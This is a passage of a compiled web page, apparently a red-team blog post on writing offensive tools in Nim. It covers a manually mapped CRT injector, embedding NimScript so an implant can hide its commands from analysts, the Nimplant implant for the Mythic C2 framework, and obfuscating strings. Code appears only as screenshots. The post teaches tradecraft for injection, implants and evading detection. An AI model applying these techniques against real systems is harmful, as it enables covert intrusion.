\"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"repository\"), \"\\nor \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.nuget.org/packages/DInvoke/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"nuget package\"), \" for solely D/Invoke.\"), mdx(\"p\", null, \"Manual Map Code:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1340px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"41.940298507462686%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABLklEQVQoz42RSZLCMAxFcxJI6AyGxBk8JDZ2RmDL/W/zW+kUdDcLisUv2WXrSV8KilMNbz2Yu4PpK5LK48A0okw+Fabi3/2dguSoICuJWF5waGZEucU+rrFPGpJ4wj6FBiFTYLmCEQod56iqFrWecao9jtUZX1TwFfYOHkQEjClJ8Aay0RDSIm8c0kKT9Q0WpvQ5/dDymhRRUtc6tP0N53lCNzq43kDZCXHeIswIyjb7OxrFLt70GMlfBVsXEs6OuA0O1lu42cFPHvpyQ0sFpBthhhndsECbAcbQm+lRNgYJFTywlw5XsqVuxukK5Rd0/UKQCVxb1KJFwSV4bVHKAVx4VGpAQTErNXghccwlWHkG43YDrkoKg7ykeJLYZ9vQH5Vfba2OHufoZ0G/S/oG1YL1KGbJiuQAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f19f9f651aaf612e5aedd6cb03cebbdd/b1ef5/dinvoke_nimmanualmapcode.webp 1340w\"],\n    \"sizes\": \"(max-width: 1340px) 100vw, 1340px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/f19f9f651aaf612e5aedd6cb03cebbdd/77a0f/dinvoke_nimmanualmapcode.png 1340w\"],\n    \"sizes\": \"(max-width: 1340px) 100vw, 1340px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/f19f9f651aaf612e5aedd6cb03cebbdd/77a0f/dinvoke_nimmanualmapcode.png\",\n    \"alt\": \"dinvokemanmapcode\",\n    \"title\": \"dinvokemanmapcode\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Let\\u2019s run it and make sure our crt injector proc is executed properly.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1912px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"43.51464435146444%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAABcElEQVQoz52Qy2rCQBSGx268YRKFEkEXMRV1YZoYg7aUIoIX2oUUurGokBcQL7hLfCy7ERR14buIbosl6l8zWhG6qHjg4zCcj3/ODHl6ziOtZZBMypAkBbKsIqWkkck8IJt9hKZloezPqVSadnuu7X1FUal/f39AkmSoqgZyF40ikYhDEATwPA+GYeD1euFyueB2u2l3Op0Uj8cDjuPAsiz1zvH5fIdAPhikQbYoKwp6vR6azSZardaJdrtNe6fTgWEYFNM0KYZhot/vo9vtIpfLgwiRCERRpLc3Gg1cW+v1GpXKG0ggEIDf7wchBPV6nQ4ty6JsNpt/sT27FosFisUyCMux9P3ngdvtFrvd7iJs167VaoVCoQTCMPsPPgbWarXThrZ4Cb8bLpdLFEsvILdhEX6WgcNxA13Xr/7Dr28LhXcdJBqNIRaLIxQKo1r9wHw+x3Q6PTL7w2w2w3g8xmQywWg0wnA4pO5g8IlS+RU/m7npTh8aQKEAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/66af0e3621b0f60c4d539a0403723250/713f7/manmapdemo.webp 1912w\"],\n    \"sizes\": \"(max-width: 1912px) 100vw, 1912px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/66af0e3621b0f60c4d539a0403723250/ff8d2/manmapdemo.png 1912w\"],\n    \"sizes\": \"(max-width: 1912px) 100vw, 1912px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/66af0e3621b0f60c4d539a0403723250/ff8d2/manmapdemo.png\",\n    \"alt\": \"manmepdemo\",\n    \"title\": \"manmepdemo\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"embedding-nimscript-with-nimscripter\"\n  }, \"Embedding NimScript with Nimscripter\"), mdx(\"p\", null, \"Within Nim, there is an evolving scripting language known as NimScript.\\nIn the NimScript \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/nims.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"documentation\"), \" it is defined as,\\n\\u201Cthe subset of Nim that can be evaluated by Nim\\u2019s built-in virtual machine (VM).\\u201D\\nNimScript is typically used as a configuration language in a devops role. An example would be to run tests and build projects.\\nHowever, one of the biggest caveats with NimScript as stated within the documentation,\\nNim\\u2019s FFI is not available in NimScript.\\nThis means that any stdlib module which relies on importc cannot be used in the VM.\\u201D\\nNim\\u2019s FFI is how Nim can call other functions written in other programming languages, which is basically\\nNim\\u2019s cross-platform version \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"P/Invoke\"), \".\\nA possible solution is to write the FFI functionality in Nim and expose it to NimScript.\"), mdx(\"p\", null, \"Does that mean NimScript is not viable? Absolutely not,\\nespecially with the slow shift in which especially for implant development\\nit\\u2019s not always ideal to statically embed everything. Instead leaning towards a lightweight\\nimplant that can dynamically resolve commands within memory so even if an analyst\\nobtains the binary, not everything is revealed.\"), mdx(\"p\", null, \"There are already a couple open source projects that show how to use\\nNimScript as an embedded scripting language.\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/komerdoor/nim-embedded-nimscript\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://github.com/komerdoor/nim-embedded-nimscript\"), \"\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/Serenitor/embeddedNimscript\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://github.com/Serenitor/embeddedNimscript\")), mdx(\"p\", null, \"However, those repositories while noble do not easily allow the user to expose Nim code to NimScript and\\nare simplistic.\\nLuckily, a new repository called \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/beef331/nimscripter\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nimscripter\"), \" allows for easy interoperability between Nim and NimScript.\"), mdx(\"p\", null, \"Below is an example in which the FFI specific code that calls \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"MessageBoxA\"), \" is exposed to NimScript.\\nThis allows us to pass in a string of NimScript to invoke the Nim proc.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"2216px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"55.05415162454873%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsSAAALEgHS3X78AAACKklEQVQoz5VRWW8SURidGfYywgCmpk0tdmEZGNayFRgsULZhCVSj8cV/6O6bRqOxKhYFl5hotZBIij5qf8DxY2nksT6cnO+e+91zv4X5c3KC4XCIb/0+Dr/3iQf/j6MBBj+G+E1ezNfDI/hyezBvlSGE6jD5KzjnOztMfgUGsQh7+ho+fv4C5qD7HmupCmzbLZgSV8BcyoC5mAazKs9AsX3GqzPdLs/dE5aT4KUSXrY7ZPiuh6V4FUvJFi6krsOyfRXWQBHWWBPmaBNCkKqItSCEa7CEFOqkASG+NwHvKcBIRpyrAIE6228fTA1tkTps8QZsCaqSTPhABRpqQ+0uQE3JEyaonLtgN7JgNrNgN3Ng1y+Do5ixZ2A+NXxLLWsp0ezPY025icXMDfC+EvhQFXy4DiPNiQ8qMNJ8Dd4SVI4cVBs7xFlwjjx9kgezvgMhoGD/NRl2uj0seIo4H8pjMVKFzqtM4cpD7ylDRw/0FGvF8kQzSLSEMdMbnbcCvVSBWizBGqqR4ZtpyyvJGkxbNegDBXCeFBhnmjgNlZQCK8rgvHR2pyfMiqS5ZQKdxTFoKWuZaYWnMxSiVEFEhjYmQxOWofJQEj1gvWTuos2KMyaNccrT2EFMn3PSWEvCFC7ixSsy7H34hJVEA+ZgCZYobZBmZ5GKMLh3qVXCPM9jpi2IBWhonsvxJtqdLpjRz1949OQZbt198A/3HuL2/bPhzpgp//HT5zgejfAXOSuzh9TdhPsAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a0329212717d301eda283a791eda6fc5/59273/nimscript_embeddedmessage.webp 2216w\"],\n    \"sizes\": \"(max-width: 2216px) 100vw, 2216px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a0329212717d301eda283a791eda6fc5/fa827/nimscript_embeddedmessage.png 2216w\"],\n    \"sizes\": \"(max-width: 2216px) 100vw, 2216px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/a0329212717d301eda283a791eda6fc5/fa827/nimscript_embeddedmessage.png\",\n    \"alt\": \"nimscript_embeddedmessage\",\n    \"title\": \"nimscript_embeddedmessage\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"In a nutshell, what is happening under the hood is the\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/beef331/nimscripter/blob/master/src/nimscripter.nim#L140\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"script is loaded\"), \" and the main body is evaluated which allows us to access the symbols it exposes.\\nA small caveat is that you need to include Nim\\u2019s stdlib as an external folder. Luckily, depending on what modules\\nyou are you using from stdlib you may be able to remove those unused modules.\\nIf you would like to read more about embedding NimScript as well as learn more about NimScript, I encourage you to check out this wonderful series:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://peterme.net/using-nimscript-as-a-configuration-language-embedding-nimscript-pt-1.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://peterme.net/using-nimscript-as-a-configuration-language-embedding-nimscript-pt-1.html\"), \".\"), mdx(\"h3\", {\n    \"id\": \"putting-the-pieces-together\"\n  }, \"Putting the Pieces Together\"), mdx(\"p\", null, \"While a simple injector is cool let\\u2019s see how hard it is to develop an implant\\nin Nim. Luckily, just within Nim\\u2019s cross-platform \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://nim-lang.org/docs/lib.html\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"stdlib\"), \" is everything needed to create a basic implant\\nfrom the FFI for API calls, httpclient for http requests, and stellar json support as a medium for data. The C2 I chose to develop the implant for is \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/its-a-feature/Mythic\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Mythic\"), \", Mythic\\nis very sophisticated and well structured. Furthermore, implants are essentially plug and play. Everything is\\ndockerized and your agent just needs to communicate back and forth via certain rest API endpoints.\"), mdx(\"p\", null, \"Sprouting a few weeks later, \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/MythicAgents/Nimplant\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nimplant\"), \" is born.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"941px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"71.41339001062698%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsSAAALEgHS3X78AAACfElEQVQ4y2NgQAI/fvxgWLVSDcyWLpFheH3MiQkmN2WZHWPQCXcw+8D1JQzfv38HYxCA0RjAdhaEzl0qyBC9ihNs2OFF5oL/7/uLgdhLV3kz5SwxYdxyrYoxY4E/WO3cw/UMeMHMg9IM////B7P/Pw51+P8yoOTSFst64wgpYWR1cy8xMFx6AVF35OoR7IZ5LuBluDPBE8xOXCjZ2T1V6SqQ2appLHp34+Xg550bXHuBfLb///8IwPTc/PAft+uc5rMwgujoAwJS2lUMF2ObfDY394f8n7HO939GifP/tmVO/xed9T1ds8bmY8lq40KQ2qp1xkzR/dHYDZQt5QLTcYtNeBi4GGRvfpgw68f/7v97nnv/bF5n9nv5A8ufdauN/nMCQ6VgsdQBkFrfEgbm5CnJuF0pW80IDMMmsEu791gkbXnk8n/tPYc/8+4Y/J9xw+B/xnylfwHlov+bdximgdQUL1FhhoU5BlCqZQHTVp2SDG5dDOBYDp8qvbhkq/z/+r3qjwrWa7WU7DCwn3LN0R+mp/pAHG7XGZYbwdmpi5TBpucu0w8Lm6Daja4W5KjIGZB01rKqBbuBX758AZKiDCHTeMBelglh8E2fqb29YYPZUukgBh+YuqJNmiziDBBvpi+yZPj27RtuV4Ysg6cIxsxtolez90v+j1gq8T9xu8D/0hNSOwMWiYqDJGM3iYAtxWsYyIUhmzjACq0nc/OlHGU/nHiI/aH1TL60+AMcm+J2cR8JWyojCw7bNcKMMMNwGgrxMjCBLxSECCjwcTJ4Swqhq8vdoYfiOryuzDoDoa1nMcLF3JawMudcZWBKP83AFL8R7ECGoE0MWA0DABlO+pUZ8BlOAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3125a933e063ab22da800b151f09b486/93ed2/nimplant_logo.webp 941w\"],\n    \"sizes\": \"(max-width: 941px) 100vw, 941px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3125a933e063ab22da800b151f09b486/a048d/nimplant_logo.png 941w\"],\n    \"sizes\": \"(max-width: 941px) 100vw, 941px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/3125a933e063ab22da800b151f09b486/a048d/nimplant_logo.png\",\n    \"alt\": \"nimplant_logo\",\n    \"title\": \"nimplant_logo\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Nimplant is a cross-platform Linux and Windows implant for Mythic C2 that is fully asynchronous.\\nThe agent is able to generate both C and C++ source code. Currently, it just has basic functionality.\\nHowever, it will be updated over time and become much more sophisticated. If you would like to learn more about Nimplant\\nfeel free to read the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/MythicAgents/Nimplant/tree/master/documentation-payload/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"project\\u2019s documentation\"), \".\"), mdx(\"p\", null, \"Example Nimplant check in:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1886px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"27.73064687168611%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABJ0AAASdAHeZh94AAAA1UlEQVQY06XQuY7CMBQFUH8MhMXOBraT2EGELSRsDRKCAjIwQD3/39wxjiJ6KI7etd+TvBAeZWC+QJ8FoCy0tUd9i7ohmDewmvzqvyoXCl7ALdcbgrkD+IEA2Z/+sChvmFtXK80OSCdHzIor8tUv8vXd5nL7MOsbJvkFhcnF9m7mfzDNK7NXodw9QWQ0MqdpyHiMRM9q6i1OpjVVa2ZsVu/5pkeWqzPKTQWtC7TaHbSd3hf65oZJBj9U5g84nA6F06V1/USXgQipMOSxeXYCIfVXZJTiH3lnxG4iaMWNAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/5ae0ab5e6ae6720c5cd26a95d1d8122b/c3fdc/nimplant_demo.webp 1886w\"],\n    \"sizes\": \"(max-width: 1886px) 100vw, 1886px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/5ae0ab5e6ae6720c5cd26a95d1d8122b/a6ea6/nimplant_demo.png 1886w\"],\n    \"sizes\": \"(max-width: 1886px) 100vw, 1886px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/5ae0ab5e6ae6720c5cd26a95d1d8122b/a6ea6/nimplant_demo.png\",\n    \"alt\": \"nimplant_demo\",\n    \"title\": \"nimplant_demo\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"obfuscation\"\n  }, \"Obfuscation\"), mdx(\"p\", null, \"With Nim, there are ample opportunities throughout the development cycle to introduce obfuscation.\\nThree key areas that I will highlight are:\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Note: These aren not the only forms of obfuscation you can do. They are just a small subset.\")), mdx(\"div\", null, mdx(\"h4\", null, \"1. Code Obfuscation\")), mdx(\"p\", null, \"With Nim opportunities for code obfuscation are ripe. Two quick and easy nimble packages\\nyou can utilize are \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/Yardanico/nim-strenc\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"nim-strenc\"), \" and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/Yardanico/nuglifier\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"nuglifier\"), \".\\nLet\\u2019s apply nim-strenc to the string literal and view the resulting C file in\\nour Nimcache.\"), mdx(\"p\", null, \"Before:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"491px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"52.54582484725051%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsSAAALEgHS3X78AAACD0lEQVQoz43TT0jTYRzH8SedDgkSitCmRNkMaqFO+7OZc5sF6SVnYQwkxJyBYGQHy5LEe537c65rHTMhu5bd0mTqNt2/It3m9vvtj3V69/w2D4qSHl48Dzyf74fv5RGZbBZFTZNMKVKKdU1ynzbz2rzWk83lEClFIZfLsrGRI6OqkkImndoHhWxG5e+fnJzPkFLUfKlIp1Vev3lH79AY/Y8mcA+P4x56ivveFkPju+q5P8HNwTFevX2PoqTypSKZTNDtGaWqwsQxexPCeB5RfhFxRDq8SbsfvbBT5SVEmYmuu6Mk4mvEE+uIX9Ew3YOPKaqxcvBcO2VnOig1t6BvaEXfaEPfZKO0rpXi2jaKjduVnL6KqGqW80+IhIOsxmKI4HIA18AIFa0uKp230Nc7KGm0oqu7jK5eMjdTbGpB1Nglx5bTQZHRKbe04PKMEPD7+L26hlgJ+GThQ8rtPVRf60V31smBk5q2ghOFs+iUcwdd7ZX8hl2y0O9blIWriHBomfbbw4hDDYjjNoRBbmNozge3MeyiWmbLzXT0PmBl2V/YMBIOMf7sBZbOfmw3BrB29mG93oflP7R3a+edQt7lYeL5S0KhILF4XBZGoywsePk285XP05+Ymprk4+SHPWm5aZmfmfnCgtdLJPoz/zFEPJEgHImwuLTEj/l5Zufm+D47uzeZ0/LanDav9ajpNP8AIEE2a58SK0wAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/6b91405cb049764789b3dcaa914603d8/c97db/hello_world_basic.webp 491w\"],\n    \"sizes\": \"(max-width: 491px) 100vw, 491px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/6b91405cb049764789b3dcaa914603d8/e4370/hello_world_basic.png 491w\"],\n    \"sizes\": \"(max-width: 491px) 100vw, 491px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/6b91405cb049764789b3dcaa914603d8/e4370/hello_world_basic.png\",\n    \"alt\": \"beforenimhello\",\n    \"title\": \"beforenimhello\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"After:\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"491px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"56.211812627291245%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsSAAALEgHS3X78AAACCklEQVQoz42Sy08TURSHb0VBYyoSo1hMSqBV4gMiaFoobelDQ60GAhETEGOURAQT0MStSxeuXbjQiI9oNEb9F3yuwRkMUza2kthOabEtlu3nvcVHIiosvpyTmXO++5uHKC4t8a1YpLC4SKFQIFfIk8uvnbzcUbvKoVxCNXl542suR3I+Q+qLiZlKYZqrk06bZLMZcnJXyZVLqCYjL167cYu+M6N0XxonODhGqF8yMEaw/0f/F46cvkz7yRGuXr+5LJYukclmic99Jtx7Ebu9ic1eF2KXZNthRLWsO92y/oOaNoS1iUMnhpiTDuUSZjpNLGbgOzVKZUsIW3MEa3MXOwIDbDpwDEtdgDJniHXO4Ao27AnLwz14eodLDuUSKdNE13X8fcPsPRrF5u3G6upkSzjARrePcpebcncrlgY/QspFfccvlFTY2nB1DTE9rZOULpGUH0DXPsiEI1RHzlPV3kPZPi/C4cPi6MCyW+KU1AdWoJKLGk9JqOsaylVK+FHaW3suIPZHqGiMImplArtMVOtfrj/7P6mTc9tdtBw/9zuheu7Z2RjRs1dY7wiwtTFC5RqpOhiloiFM5+B4yWGm5xHZhQXi8Tiv377n6fOX3Hv4mDsT97l99/+omYkHj3jy7AWv3rzjk3Qol1B/ukqZSCQwDANN05iammRyFdSMJt+9YcwQl7vKoVzfAbTHMvkCHoYdAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/c282e87fe02cf7ca70c23d2ec7127c68/c97db/strenc_hello_world.webp 491w\"],\n    \"sizes\": \"(max-width: 491px) 100vw, 491px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  